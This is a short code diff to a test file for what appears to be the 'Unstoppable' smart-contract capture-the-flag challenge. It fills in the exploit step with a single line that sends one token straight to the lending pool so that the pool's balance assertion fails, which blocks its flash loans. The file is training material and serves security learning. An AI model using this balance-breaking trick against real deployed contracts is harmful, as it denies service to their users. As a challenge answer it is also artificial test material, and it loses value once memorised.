@@ -39,7 +39,8 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // trip over assert(poolBalance == balanceBefore);
+        await this.token.transfer(this.pool.address, 1, {from : attacker})
     });
 
     after(async function () {
